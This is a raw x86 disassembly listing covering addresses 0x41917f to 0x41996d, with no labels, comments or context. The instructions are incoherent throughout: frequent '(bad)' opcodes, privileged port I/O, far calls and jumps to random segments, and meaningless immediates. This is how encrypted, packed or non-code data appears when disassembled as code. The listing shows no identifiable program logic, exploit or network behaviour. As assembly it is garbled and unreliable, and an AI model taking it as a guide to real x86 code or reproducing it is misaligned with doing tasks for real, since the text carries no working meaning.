  41917f:	or     dh,BYTE PTR [ecx+0x73e77ec5]
  419185:	xchg   DWORD PTR [eax-0x3b77cab1],ebp
  41918b:	adc    eax,0x32730c2
  419190:	sub    ah,BYTE PTR [edi+edx*8]
  419193:	sub    eax,0x10e26390
  419198:	loope  0x41913c
  41919a:	ss jno 0x4191a9
  41919d:	xchg   BYTE PTR [edi-0x787e3e99],ah
  4191a3:	aad    0xb4
  4191a5:	and    dl,BYTE PTR [esi]
  4191a7:	aam    0xe5
  4191a9:	ja     0x419182
  4191ab:	mov    ebp,0x84ef8db5
  4191b0:	ins    BYTE PTR es:[edi],dx
  4191b1:	push   ebp
  4191b2:	jle    0x4191ac
  4191b4:	mov    esi,0x460da3b1
  4191b9:	sub    edx,ebx
  4191bb:	sar    BYTE PTR [eax+0x5352e2f7],1
  4191c1:	inc    eax
  4191c2:	mov    edi,DWORD PTR [edx]
  4191c4:	into   
  4191c5:	sub    ah,BYTE PTR [ebp-0x3a1bdb5]
  4191cb:	mov    ah,0x7f
  4191cd:	push   ebx
  4191ce:	test   al,0x37
  4191d1:	mov    cl,0xe6
  4191d3:	or     DWORD PTR [eax-0x2ac42ba],ebx
  4191d9:	dec    ecx
  4191da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191db:	ja     0x41924f
  4191dd:	jnp    0x4191a2
  4191df:	pusha  
  4191e0:	call   0x1a5cb2ce
  4191e5:	cmp    BYTE PTR [eax+0x23],dh
  4191e8:	xchg   ebp,eax
  4191e9:	xchg   esp,eax
  4191ea:	cmp    DWORD PTR [ebx-0x5a5c229b],0x32
  4191f1:	inc    ebp
  4191f2:	mov    dl,0xa6
  4191f4:	je     0x419260
  4191f6:	or     eax,0x9c5ceb39
  4191fb:	std    
  4191fc:	in     eax,dx
  4191fd:	xlat   BYTE PTR ds:[ebx]
  4191fe:	pop    esp
  4191ff:	mov    cl,0x42
  419201:	pop    edi
  419202:	or     eax,0xe4907994
  419207:	cmp    eax,0xb5b35529
  41920c:	(bad)  
  41920d:	xchg   esp,eax
  41920e:	dec    bp
  419210:	pop    ss
  419211:	push   esi
  419212:	out    0xf2,al
  419214:	mov    ds:0x66495e27,al
  419219:	ins    DWORD PTR es:[edi],dx
  41921a:	jg     0x41920a
  41921c:	test   al,0x9e
  41921e:	stos   BYTE PTR es:[edi],al
  41921f:	push   ecx
  419220:	sbb    BYTE PTR [edx+esi*8-0x7b],ah
  419224:	(bad)  
  419225:	mov    esp,0xdb38a319
  41922a:	inc    esp
  41922b:	jl     0x419204
  41922d:	sub    DWORD PTR [edx+0x44],esp
  419230:	int    0xb0
  419232:	out    0x53,eax
  419234:	mov    ebp,0xdf76a6ee
  419239:	push   esi
  41923a:	and    eax,ecx
  41923c:	(bad)  
  41923d:	das    
  41923e:	mov    ebx,0x13626831
  419243:	enter  0x9fc8,0x80
  419247:	jb     0x41921d
  419249:	das    
  41924a:	fidiv  WORD PTR [edx]
  41924c:	add    DWORD PTR [ecx],ebp
  41924e:	sbb    ecx,DWORD PTR [esi-0x19ec8fbb]
  419254:	cdq    
  419255:	retf   0xa6fc
  419258:	cli    
  419259:	(bad)  
  41925a:	jmp    0x4192d9
  41925c:	not    BYTE PTR [ecx-0x1943a341]
  419262:	jge    0x419286
  419264:	sbb    bh,BYTE PTR [ecx-0x7a]
  419267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419268:	std    
  419269:	jge    0x419209
  41926b:	(bad)  
  41926d:	adc    eax,0xdf95a71f
  419272:	sbb    al,0xb3
  419274:	jno    0x419270
  419276:	inc    esi
  419277:	pop    esi
  419278:	aas    
  419279:	or     esi,esi
  41927b:	pop    ds
  41927c:	xchg   BYTE PTR [edi],ah
  41927e:	and    eax,0x6f7102e9
  419283:	push   ss
  419284:	sar    BYTE PTR [ebp-0x44],1
  419287:	and    BYTE PTR [eax-0xeef3d6b],dh
  41928d:	enter  0xb3e3,0xb4
  419291:	push   ecx
  419292:	mov    WORD PTR [ebx],ds
  419294:	dec    esp
  419295:	aam    0x17
  419297:	jo     0x4192c9
  419299:	sbb    al,0xa6
  41929b:	pop    esi
  41929c:	mov    eax,ds:0x808e8a1b
  4192a1:	push   ecx
  4192a2:	and    ecx,DWORD PTR [edx+0x40a20cd]
  4192a8:	push   ebp
  4192a9:	jne    0x41931c
  4192ab:	cli    
  4192ac:	(bad)  
  4192ad:	iret   
  4192ae:	fild   WORD PTR [ebp+0x7e8579f0]
  4192b4:	mov    al,0x96
  4192b6:	pop    edx
  4192b7:	adc    DWORD PTR [ebp+0x50],esi
  4192ba:	test   BYTE PTR [ecx+0xe],bl
  4192bd:	sahf   
  4192be:	(bad)  
  4192bf:	push   ebx
  4192c0:	imul   esi,DWORD PTR [ecx+eax*8+0x4e7ed068],0xffffffe1
  4192c8:	div    BYTE PTR [esp+ebp*2+0x74d1a5fe]
  4192cf:	or     BYTE PTR [ebx-0x40],ch
  4192d2:	call   0x64d1:0x72d36b8b
  4192d9:	cmp    DWORD PTR [edx-0x72dfbd7c],edx
  4192df:	lock mov bh,0xed
  4192e2:	arpl   WORD PTR [ebp-0x6],cx
  4192e5:	pop    esi
  4192e6:	xor    BYTE PTR [eax],ch
  4192e8:	sbb    ebx,ebp
  4192ea:	add    dl,BYTE PTR [edx+0x6bfd97dd]
  4192f0:	fucomp st(0)
  4192f2:	rdtsc  
  4192f4:	mov    ecx,ebp
  4192f6:	fimul  DWORD PTR [esi+edx*1-0x26430557]
  4192fd:	xchg   BYTE PTR [ecx+0x38f2637e],ch
  419303:	sbb    eax,0x23270033
  419308:	pop    edx
  419309:	pop    ss
  41930a:	cmc    
  41930b:	jb     0x41938c
  41930d:	mov    ds:0xf4ff7700,eax
  419312:	inc    ebp
  419313:	ins    DWORD PTR es:[edi],dx
  419314:	adc    eax,0x3fb34866
  419319:	rol    BYTE PTR [edi],cl
  41931b:	arpl   WORD PTR [edx-0x1b],di
  41931e:	and    eax,DWORD PTR [eax-0x1]
  419321:	jl     0x41938a
  419323:	clc    
  419324:	out    dx,al
  419325:	and    eax,0x148e5536
  41932a:	dec    edx
  41932b:	int    0x28
  41932d:	aam    0x16
  41932f:	cmp    DWORD PTR [eax-0x48],0xa56f97d4
  419336:	inc    edx
  419337:	stos   DWORD PTR es:[edi],eax
  419338:	icebp  
  419339:	lods   al,BYTE PTR ds:[esi]
  41933a:	outs   dx,BYTE PTR ds:[esi]
  41933b:	leave  
  41933c:	mov    cl,0x64
  41933e:	mov    ds:0xb1a6af75,eax
  419343:	mov    ah,0xd8
  419345:	push   ds
  419346:	pop    ebp
  419347:	retf   0xb018
  41934a:	jp     0x4192fd
  41934c:	test   eax,0x2748ecf1
  419351:	xor    BYTE PTR [edx-0x21b2f135],0x3a
  419358:	push   ecx
  419359:	es sti 
  41935b:	int    0x74
  41935d:	push   cs
  41935e:	rcr    ecx,0x51
  419361:	push   esp
  419362:	sub    al,0x8f
  419364:	enter  0xb579,0xc8
  419368:	das    
  419369:	jbe    0x419335
  41936b:	push   ebx
  41936c:	mov    eax,0x69668a98
  419371:	dec    ecx
  419372:	sub    al,0xce
  419374:	push   esi
  419375:	pop    ebx
  419376:	inc    edx
  419377:	mov    BYTE PTR [esp+ebx*4+0x37],ch
  41937b:	or     al,0xfe
  41937d:	cmp    DWORD PTR [ebp-0x51262718],edi
  419383:	out    dx,eax
  419384:	inc    esp
  419385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419386:	jg     0x419378
  419388:	jecxz  0x41939f
  41938a:	stos   WORD PTR es:[edi],ax
  41938c:	lds    esp,FWORD PTR [edi-0x67]
  41938f:	push   edi
  419390:	adc    al,0xf8
  419392:	xchg   DWORD PTR [ecx-0x5],ebp
  419395:	push   edi
  419396:	nop
  419397:	ret    0xe3b4
  41939a:	cmc    
  41939b:	out    0x12,al
  41939d:	(bad)  
  41939e:	push   esi
  41939f:	xor    ebp,DWORD PTR [ebp+0x25]
  4193a2:	(bad)  [ebp+eax*1+0x28b02b27]
  4193a9:	or     eax,0x843ac7ca
  4193ae:	jno    0x419407
  4193b0:	cmp    ebp,DWORD PTR [edx]
  4193b2:	outs   dx,BYTE PTR ds:[esi]
  4193b3:	jbe    0x4193d1
  4193b5:	(bad)  
  4193b6:	aaa    
  4193b7:	inc    esi
  4193b8:	add    eax,0x98362271
  4193bd:	arpl   WORD PTR [edi-0x4fe5b201],si
  4193c3:	pop    esp
  4193c4:	pop    edx
  4193c5:	pop    esp
  4193c6:	xchg   edx,eax
  4193c7:	std    
  4193c8:	cmovne esi,DWORD PTR [edi-0x1d97cce0]
  4193cf:	mov    esi,0x8fdbcdb5
  4193d4:	cdq    
  4193d5:	push   cs
  4193d6:	mov    bh,BYTE PTR [edx]
  4193d8:	out    dx,eax
  4193d9:	add    ebx,DWORD PTR [ebx-0x2816f6f3]
  4193df:	adc    al,0x4e
  4193e1:	ss push edx
  4193e3:	cmp    esp,DWORD PTR [eax]
  4193e5:	and    DWORD PTR ds:0x8c7c65b0,edx
  4193eb:	cmovnp esi,DWORD PTR [eax]
  4193ee:	cwde   
  4193ef:	jns    0x4193b4
  4193f1:	mov    esp,0x7c5d374e
  4193f6:	cmc    
  4193f7:	imul   ecx,DWORD PTR [ecx],0x5651e6cb
  4193fd:	sbb    BYTE PTR [edx+0x1a],dl
  419400:	std    
  419401:	fsub   QWORD PTR [edi+0x24fe197d]
  419407:	adc    esi,DWORD PTR [ebx-0x5]
  41940a:	cmc    
  41940b:	cmp    ebp,eax
  41940d:	ss hlt 
  41940f:	arpl   WORD PTR [edx],dx
  419411:	loopne 0x4193be
  419413:	push   0x39
  419415:	(bad)  
  419416:	pop    edi
  419417:	or     edx,0xcdde3858
  41941d:	push   ebp
  41941e:	push   esi
  41941f:	loope  0x41941c
  419421:	cmp    al,0x95
  419423:	pop    ds
  419424:	popf   
  419425:	fcom   QWORD PTR [ecx-0x7c]
  419428:	dec    edx
  419429:	xlat   BYTE PTR ds:[ebx]
  41942a:	push   es
  41942b:	cmp    eax,DWORD PTR [edi+0xb]
  41942e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41942f:	in     al,dx
  419430:	jmp    0x4194af
  419432:	in     eax,dx
  419433:	add    eax,0xf91a8c2
  419438:	sub    al,0xe
  41943a:	sbb    al,0xe
  41943c:	jle    0x419413
  41943e:	pop    eax
  41943f:	mov    ch,0xae
  419441:	loopne 0x4193ed
  419443:	push   esi
  419444:	add    BYTE PTR [esi],bl
  419446:	push   es
  419447:	in     al,0x8c
  419449:	or     al,0x1b
  41944b:	imul   ebp,DWORD PTR [esi+edi*4],0xffffffe3
  41944f:	or     ah,BYTE PTR ds:0x2d8fb788
  419455:	sbb    al,0x9a
  419457:	jp     0x4194bd
  419459:	push   esi
  41945a:	xchg   BYTE PTR [ecx-0x619938d],ah
  419460:	jecxz  0x41943e
  419462:	fcomp  QWORD PTR [eax]
  419464:	int3   
  419465:	fld    DWORD PTR [edx]
  419467:	std    
  419468:	xchg   edx,eax
  419469:	mov    cl,0x5e
  41946b:	push   0x36
  41946d:	xchg   edi,eax
  41946e:	dec    ebx
  41946f:	sbb    al,0x2c
  419471:	je     0x419444
  419473:	pop    es
  419474:	push   ecx
  419475:	lea    ebp,ds:0xc30e4e74
  41947b:	stos   BYTE PTR es:[edi],al
  41947c:	sbb    bl,BYTE PTR [edx]
  41947e:	retf   0x561c
  419481:	stc    
  419482:	mov    esp,0x92654db
  419487:	fcom   QWORD PTR [ebx]
  419489:	inc    ebp
  41948a:	js     0x4194de
  41948c:	add    dh,bh
  41948e:	(bad)  
  41948f:	sbb    dl,dl
  419491:	test   edi,ebp
  419493:	xor    ebx,DWORD PTR [eax+eax*8-0x10]
  419497:	(bad)  
  419498:	call   0x5cce4765
  41949d:	jecxz  0x4194c6
  41949f:	hlt    
  4194a0:	sbb    esp,DWORD PTR [edx-0x44f780a7]
  4194a6:	xor    eax,0x2f0d979e
  4194ab:	sub    ecx,ecx
  4194ad:	imul   esp,DWORD PTR [ebp+eax*4+0x7c884ba3],0x86d8f21f
  4194b8:	sbb    al,0x43
  4194ba:	pop    es
  4194bb:	jl     0x41951e
  4194bd:	(bad)  
  4194be:	push   ebp
  4194bf:	jnp    0x419518
  4194c1:	fisub  WORD PTR [esi+ebp*8+0x12]
  4194c5:	pop    ebx
  4194c6:	pop    ebx
  4194c7:	mov    ds,WORD PTR [edi]
  4194c9:	imul   BYTE PTR [esi]
  4194cb:	jnp    0x419479
  4194cd:	add    eax,0xbe1221eb
  4194d2:	jg     0x419528
  4194d4:	xor    ecx,DWORD PTR [edi]
  4194d6:	mov    bl,0xc1
  4194d8:	pop    esi
  4194d9:	add    al,0x62
  4194db:	xor    dl,dl
  4194dd:	inc    ecx
  4194de:	cmp    BYTE PTR [ebp+0x4a64c6fb],al
  4194e4:	shl    BYTE PTR [ebx],cl
  4194e6:	pop    esp
  4194e7:	adc    al,0x19
  4194e9:	mov    edx,0x3d43a862
  4194ee:	push   ecx
  4194ef:	xor    al,0xab
  4194f1:	xor    DWORD PTR [eax-0x1f],esp
  4194f4:	ror    BYTE PTR [esi-0xc330015],0x4
  4194fb:	jg     0x419536
  4194fd:	inc    esp
  4194fe:	sub    eax,0x7de2a58e
  419503:	cmp    DWORD PTR [ebp-0x35bb9368],eax
  419509:	(bad)  
  41950a:	popa   
  41950b:	jnp    0x419573
  41950d:	ins    DWORD PTR es:[edi],dx
  41950e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41950f:	jo     0x4194a3
  419511:	push   esi
  419512:	mov    bl,0x1
  419514:	pop    edi
  419515:	push   ecx
  419516:	add    DWORD PTR [esi+0x72ad1b5f],ebx
  41951c:	pusha  
  41951d:	in     eax,0xe3
  41951f:	and    eax,DWORD PTR [esi+0x3]
  419522:	sub    al,0xf4
  419524:	es push eax
  419526:	cmp    eax,0xa2444ec
  41952b:	ret    0x7fe5
  41952e:	xor    al,0xc3
  419530:	mov    BYTE PTR [esi-0x695a58fd],al
  419536:	dec    ebx
  419537:	ror    DWORD PTR [ebp+0x5e],cl
  41953a:	inc    edx
  41953b:	sub    esp,DWORD PTR [eax]
  41953d:	test   eax,0x806ca757
  419542:	outs   dx,BYTE PTR ds:[esi]
  419543:	test   BYTE PTR [ebx+0x7c4f2413],al
  419549:	cmp    eax,0xff6f4e0
  41954e:	or     eax,0x97e4db49
  419553:	int    0xdc
  419555:	and    DWORD PTR [eax+0x5fbe2a34],ecx
  41955b:	jmp    0x419512
  41955d:	jb     0x4195a2
  41955f:	repz icebp 
  419561:	fst    QWORD PTR [edx+0x519f7a3b]
  419567:	shr    BYTE PTR [ecx],1
  419569:	stos   BYTE PTR es:[edi],al
  41956a:	pop    ecx
  41956b:	dec    edx
  41956c:	mov    ebp,DWORD PTR [ebp+ecx*1+0x5ba44c7e]
  419573:	mov    bh,0x58
  419575:	rcl    dl,cl
  419577:	(bad)  
  419579:	fstp   DWORD PTR [ebx-0x3b]
  41957c:	push   ecx
  41957d:	imul   edi,DWORD PTR [edi+0xd251b9f],0x2e7ed438
  419587:	jnp    0x419526
  419589:	pop    esi
  41958a:	out    0x36,al
  41958c:	outs   dx,BYTE PTR ds:[esi]
  41958d:	xchg   ebx,eax
  41958e:	and    DWORD PTR [eax+0x2354a10],esi
  419594:	ds fs out dx,al
  419597:	ins    DWORD PTR es:[edi],dx
  419598:	(bad)  
  419599:	lock mov ebp,0x343f8e2a
  41959f:	(bad)  
  4195a1:	shl    esp,0xe4
  4195a4:	clc    
  4195a5:	xor    ecx,eax
  4195a7:	popa   
  4195a8:	pop    ecx
  4195a9:	adc    eax,0x11a7726a
  4195ae:	jmp    0x172f:0x7b36c91b
  4195b5:	dec    ah
  4195b7:	and    BYTE PTR [eax+0x41960069],cl
  4195bd:	push   ebx
  4195be:	test   al,0xdd
  4195c0:	int3   
  4195c1:	jbe    0x419566
  4195c3:	inc    edx
  4195c4:	and    edx,DWORD PTR [edx+0xf]
  4195c7:	push   ecx
  4195c8:	icebp  
  4195c9:	retf   0xbab0
  4195cc:	push   eax
  4195cd:	jl     0x419577
  4195cf:	jl     0x419577
  4195d1:	fdivp  st(3),st
  4195d3:	add    bl,BYTE PTR ds:0x97f42e59
  4195d9:	and    dl,dh
  4195db:	xchg   edx,eax
  4195dc:	jmp    0x7d1f:0xa4b83d45
  4195e3:	stos   BYTE PTR es:[edi],al
  4195e4:	les    ebp,FWORD PTR [edi+edx*8+0x4a37ebd]
  4195eb:	and    BYTE PTR [ebp-0x62],dh
  4195ee:	push   edx
  4195ef:	popf   
  4195f0:	test   DWORD PTR [ebp+0x2],edi
  4195f3:	or     al,dh
  4195f5:	(bad)  
  4195f6:	pop    ss
  4195f7:	in     eax,dx
  4195f8:	push   eax
  4195f9:	das    
  4195fa:	in     al,0x49
  4195fc:	xchg   ebp,eax
  4195fd:	mov    ds:0x47de749a,al
  419602:	dec    edi
  419603:	rcl    DWORD PTR [ecx-0x4b3f591],0x29
  41960a:	and    al,0x3
  41960c:	add    ch,BYTE PTR ds:0x11f22f3b
  419612:	sbb    cl,dl
  419614:	ret    0xd5dc
  419617:	leave  
  419618:	xchg   edx,eax
  419619:	js     0x41966a
  41961b:	cmp    eax,0x3c1b3288
  419620:	dec    eax
  419621:	inc    eax
  419622:	shr    DWORD PTR [edx-0x400ec8],1
  419628:	nop
  419629:	xor    al,0xe
  41962b:	mov    ds:0xcc179367,eax
  419630:	inc    eax
  419631:	add    al,0x51
  419633:	int    0x17
  419635:	call   0xd80a:0x546b2524
  41963c:	xchg   ebp,eax
  41963d:	inc    esi
  41963e:	jmp    0xee33111f
  419643:	inc    eax
  419644:	jl     0x4195d3
  419646:	dec    ecx
  419647:	test   esp,0xafdef6e3
  41964d:	dec    ecx
  41964e:	sbb    eax,0xecf178f5
  419653:	and    al,0xd9
  419655:	les    eax,FWORD PTR [ebx-0x7d]
  419658:	test   eax,0x6248a1f8
  41965d:	in     eax,0xc5
  41965f:	test   DWORD PTR [ebx-0x57],esi
  419662:	das    
  419663:	imul   edx,edx,0x90868238
  419669:	pushf  
  41966a:	cmp    eax,0xf2857bb4
  41966f:	pushf  
  419670:	retf   
  419671:	scas   eax,DWORD PTR es:[edi]
  419672:	cld    
  419673:	add    DWORD PTR [ebx+0x34d20d3d],ebp
  419679:	mov    esp,0xd2b21600
  41967e:	cmp    al,0xaf
  419680:	out    0x58,eax
  419682:	or     edi,DWORD PTR [edi+0x44]
  419685:	add    eax,0x5410d1f6
  41968a:	jae    0x41966b
  41968c:	cmp    dl,BYTE PTR [eax+ebx*8]
  41968f:	test   BYTE PTR [esi-0x449f4782],dl
  419695:	xor    eax,0x6f40f3b6
  41969a:	cmp    eax,0x378a825
  41969f:	pop    edi
  4196a0:	add    ch,BYTE PTR [eax-0x1a9802b1]
  4196a6:	dec    ecx
  4196a7:	pop    edi
  4196a8:	imul   ecx,DWORD PTR [eax+edi*4+0x34255253],0x2c31de1d
  4196b3:	push   0xade023b7
  4196b8:	nop
  4196b9:	dec    ebp
  4196ba:	aad    0x8
  4196bc:	pop    ebp
  4196bd:	mov    ch,0xe
  4196bf:	sti    
  4196c0:	push   ebx
  4196c1:	mov    dl,0xa6
  4196c3:	out    0x64,al
  4196c5:	pop    ds
  4196c6:	mov    edi,DWORD PTR [esi]
  4196c8:	out    0x1a,eax
  4196ca:	inc    esp
  4196cb:	mov    ebp,0x9b855fbd
  4196d0:	ror    DWORD PTR [edi],cl
  4196d2:	pop    eax
  4196d3:	jecxz  0x4196b9
  4196d5:	push   ecx
  4196d6:	lock cli 
  4196d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d9:	cmp    al,0x69
  4196db:	fsubr  st(3),st
  4196dd:	aam    0x32
  4196df:	lds    edi,FWORD PTR [edx+edx*1+0x34]
  4196e3:	and    DWORD PTR [esi-0x49],edi
  4196e6:	mov    WORD PTR [esi+eiz*2+0x7d],es
  4196ea:	aas    
  4196eb:	jmp    0xeac29fe3
  4196f0:	pop    es
  4196f1:	imul   ebx,DWORD PTR [esi-0x72],0x99f7db6
  4196f8:	sbb    ecx,ebp
  4196fa:	dec    ecx
  4196fb:	inc    edi
  4196fc:	and    al,0xd
  4196fe:	inc    esi
  4196ff:	jbe    0x419773
  419701:	call   0x5e6c:0x1ce7349d
  419708:	and    DWORD PTR [esi-0x6e],esi
  41970b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41970c:	imul   DWORD PTR [esi]
  41970e:	lods   eax,DWORD PTR ds:[esi]
  41970f:	mov    es:0x8ab4f091,eax
  419715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419716:	fiadd  WORD PTR [eax+0x2c7626f1]
  41971c:	or     edi,DWORD PTR [ebp-0x2c8866d4]
  419722:	int    0x72
  419724:	stc    
  419725:	mul    BYTE PTR [edi]
  419727:	or     DWORD PTR [edx],ebp
  419729:	call   0x6860b77e
  41972e:	hlt    
  41972f:	push   cs
  419730:	data16 adc al,0xf3
  419733:	das    
  419734:	in     eax,0x7
  419736:	scas   al,BYTE PTR es:[edi]
  419737:	(bad)  
  419738:	add    edx,DWORD PTR [edx]
  41973a:	test   ecx,edx
  41973c:	fs cmp bh,bl
  41973f:	and    eax,0x4d301ad3
  419744:	and    dl,BYTE PTR [ebp-0x2e]
  419747:	mov    ah,0xf5
  419749:	ins    DWORD PTR es:[edi],dx
  41974a:	dec    ebp
  41974b:	and    ebp,edi
  41974d:	sub    eax,0xf7acd5e8
  419752:	pop    ds
  419753:	lahf   
  419754:	test   edx,esi
  419756:	push   0xfffffffc
  419758:	lahf   
  419759:	mov    esp,0x9d423949
  41975e:	cld    
  41975f:	retf   0xd276
  419762:	and    DWORD PTR [edx+0x5f97f85f],edx
  419768:	ins    BYTE PTR es:[edi],dx
  419769:	add    eax,0x1e3c20b9
  41976e:	xlat   BYTE PTR ds:[ebx]
  41976f:	jge    0x419756
  419771:	inc    edx
  419772:	cmp    DWORD PTR [ecx+ebx*2+0x283210],0x0
  41977a:	lods   al,BYTE PTR ds:[esi]
  41977b:	xchg   edx,eax
  41977c:	cmp    BYTE PTR [ecx],bh
  41977e:	cmp    DWORD PTR [edi+0x7b],eax
  419781:	mov    eax,0x7ba59cf2
  419786:	jg     0x419799
  419788:	imul   ecx,DWORD PTR cs:[ecx],0xc5a175b2
  41978f:	adc    eax,0x61327639
  419794:	into   
  419795:	sbb    DWORD PTR [eax*2+0x58bb131e],0x23
  41979d:	mov    eax,0x49465f67
  4197a2:	push   cs
  4197a3:	pop    ebx
  4197a4:	pop    eax
  4197a5:	mov    ch,0xe9
  4197a7:	leave  
  4197a8:	push   edx
  4197a9:	lds    eax,FWORD PTR ds:0x901257a
  4197af:	mov    dl,0xfb
  4197b1:	mov    edi,DWORD PTR [esi-0x6c0930b4]
  4197b7:	ficom  DWORD PTR [ebx+0x62]
  4197ba:	out    0x27,al
  4197bc:	aam    0x63
  4197be:	shr    cl,cl
  4197c0:	mov    ebp,0x3344a929
  4197c5:	repnz pop ss
  4197c7:	jo     0x4197e7
  4197c9:	cmc    
  4197ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197cb:	popf   
  4197cc:	dec    edi
  4197cd:	repnz mov dh,BYTE PTR [esp+edi*2-0x70e1b0e5]
  4197d5:	jp     0x4197f8
  4197d7:	dec    ebx
  4197d8:	mov    eax,ds:0x627fe4ef
  4197dd:	loopne 0x4197a1
  4197df:	arpl   si,sp
  4197e1:	in     eax,dx
  4197e2:	rol    DWORD PTR [edi],1
  4197e4:	ret    0xaeb5
  4197e7:	pop    ecx
  4197e8:	inc    esi
  4197e9:	mov    ebx,0xf8ecb518
  4197ee:	fadd   DWORD PTR [ebx]
  4197f0:	in     eax,0xaf
  4197f2:	repnz or bl,BYTE PTR ds:0xee67cbb0
  4197f9:	sbb    eax,0x3984ad16
  4197fe:	sub    ch,BYTE PTR [ecx]
  419800:	mov    BYTE PTR [edi+0x70],bh
  419803:	int    0x9f
  419805:	mov    edi,ds
  419807:	loope  0x419874
  419809:	neg    DWORD PTR [ebx-0x40]
  41980c:	lds    ebx,FWORD PTR [edx-0x80]
  41980f:	inc    esp
  419810:	(bad)  
  419811:	cwde   
  419812:	(bad)  
  419813:	fild   QWORD PTR [eax-0x64]
  419816:	or     DWORD PTR [esi],edi
  419818:	jno    0x41986a
  41981a:	mov    bl,0xee
  41981c:	icebp  
  41981d:	mov    WORD PTR [edx-0x4e776ed0],fs
  419823:	and    BYTE PTR [ebx],ah
  419825:	nop
  419826:	data16 hlt 
  419828:	add    BYTE PTR [ebp-0x57],dl
  41982b:	jne    0x419887
  41982d:	xchg   ah,cl
  41982f:	sahf   
  419830:	mov    al,ds:0xf323e654
  419835:	push   esp
  419836:	mov    esp,DWORD PTR [edx]
  419838:	xor    eax,0x8da0f38d
  41983d:	test   DWORD PTR [esi],0x34fec1dd
  419843:	in     al,0x8c
  419845:	stos   DWORD PTR es:[edi],eax
  419846:	jge    0x419845
  419848:	xchg   edi,eax
  419849:	sub    edx,edx
  41984b:	jl     0x41980d
  41984d:	cmp    dl,ch
  41984f:	mov    DWORD PTR [esi-0x4604ace4],ebp
  419855:	outs   dx,DWORD PTR ds:[esi]
  419856:	cmp    BYTE PTR [ebp-0x6b],bh
  419859:	push   ds
  41985a:	adc    edx,DWORD PTR [eax]
  41985c:	stos   DWORD PTR es:[edi],eax
  41985d:	add    edi,ecx
  41985f:	or     DWORD PTR ds:0x98a5c86d,ebp
  419865:	cmp    al,0xd5
  419867:	retf   
  419868:	xlat   BYTE PTR ds:[ebx]
  419869:	add    DWORD PTR [ecx],ebp
  41986b:	xchg   DWORD PTR [esi],esi
  41986d:	pop    esp
  41986e:	rcl    DWORD PTR [edi-0x46b57299],cl
  419874:	popf   
  419875:	ficom  WORD PTR [eax-0x5e566114]
  41987b:	(bad)  
  41987c:	retf   0x6bc8
  41987f:	outs   dx,BYTE PTR ds:[esi]
  419880:	fst    st(7)
  419882:	adc    dl,cl
  419884:	icebp  
  419885:	rol    BYTE PTR [eax+0x69],cl
  419888:	test   al,0x6e
  41988a:	jl     0x419880
  41988c:	dec    esi
  41988d:	inc    edi
  41988e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41988f:	outs   dx,DWORD PTR ds:[esi]
  419890:	jg     0x419864
  419892:	mov    edx,DWORD PTR [ebp+ebp*8+0x12b36ee6]
  419899:	push   ss
  41989a:	gs jnp 0x4198b2
  41989d:	sbb    al,0x2c
  41989f:	sub    al,0xfd
  4198a1:	ins    BYTE PTR es:[edi],dx
  4198a2:	fwait
  4198a3:	cld    
  4198a4:	add    DWORD PTR [esi],ebx
  4198a6:	mov    ah,0x3a
  4198a8:	outs   dx,BYTE PTR ds:[esi]
  4198a9:	into   
  4198aa:	jl     0x4198f0
  4198ac:	mov    cl,0xf5
  4198ae:	jnp    0x41983a
  4198b0:	aad    0x54
  4198b2:	cld    
  4198b3:	rcl    BYTE PTR [ebx+0x62e29bf1],0x38
  4198ba:	mov    ds:0x7949845e,al
  4198bf:	sahf   
  4198c0:	ss mov bh,0x1d
  4198c3:	xor    al,0xd4
  4198c5:	out    0x30,eax
  4198c7:	hlt    
  4198c8:	arpl   WORD PTR [ecx-0x28],sp
  4198cb:	or     eax,edi
  4198cd:	out    0xd6,eax
  4198cf:	hlt    
  4198d0:	adc    al,0x26
  4198d2:	sub    BYTE PTR [ebx-0x4f3c566],bh
  4198d8:	cmp    BYTE PTR [ebp+0x4c],bl
  4198db:	jge    0x41987a
  4198dd:	int3   
  4198de:	adc    eax,0x83df10bc
  4198e3:	jmp    0x4198e7
  4198e5:	pushf  
  4198e6:	push   ss
  4198e7:	cdq    
  4198e8:	pop    edi
  4198e9:	hlt    
  4198ea:	sbb    eax,0x8c490293
  4198ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f0:	mov    ah,0x6f
  4198f2:	push   0x2dfd02d3
  4198f7:	push   esp
  4198f8:	inc    edx
  4198f9:	add    BYTE PTR [esi-0x798e7ceb],dl
  4198ff:	xor    ebp,DWORD PTR [ebx]
  419901:	jbe    0x41989f
  419903:	repz sbb al,0x79
  419906:	cli    
  419907:	xor    bl,dl
  419909:	xchg   ecx,eax
  41990a:	dec    esi
  41990b:	push   esp
  41990c:	sahf   
  41990d:	int3   
  41990e:	ret    0xfe8f
  419911:	cmp    esp,DWORD PTR [eax]
  419913:	lods   eax,DWORD PTR ds:[esi]
  419914:	or     eax,0x5b3cc7e
  419919:	inc    ebx
  41991a:	mul    BYTE PTR [ebx+edi*8+0xcb24201]
  419921:	jne    0x4198b4
  419923:	pop    eax
  419924:	cdq    
  419925:	sbb    BYTE PTR [ecx],0x72
  419928:	sub    dl,0xb9
  41992b:	add    ebp,DWORD PTR [ecx+ecx*8-0x4aba4a17]
  419932:	ficom  DWORD PTR [ecx+0x7ddbc566]
  419938:	inc    ebp
  419939:	fdivr  st(0),st
  41993b:	enter  0x1ed,0xe8
  41993f:	daa    
  419940:	push   ss
  419941:	pop    edx
  419942:	sysret 
  419944:	jno    0x4198cc
  419946:	cmp    ebx,ecx
  419948:	fs inc eax
  41994a:	inc    esi
  41994b:	xor    bh,BYTE PTR [edi-0x5b]
  41994e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41994f:	test   al,0x14
  419951:	pop    ds
  419952:	imul   ecx,ebx,0x34
  419955:	mov    dl,0x9c
  419957:	sub    al,0x7d
  419959:	popa   
  41995a:	lock mov BYTE PTR [esi],dl
  41995d:	call   0xec25:0xfe908bd3
  419964:	sbb    dl,ah
  419966:	pop    ebp
  419967:	mov    ss,WORD PTR [edx-0x28f8c511]
  41996d:	dec    edx
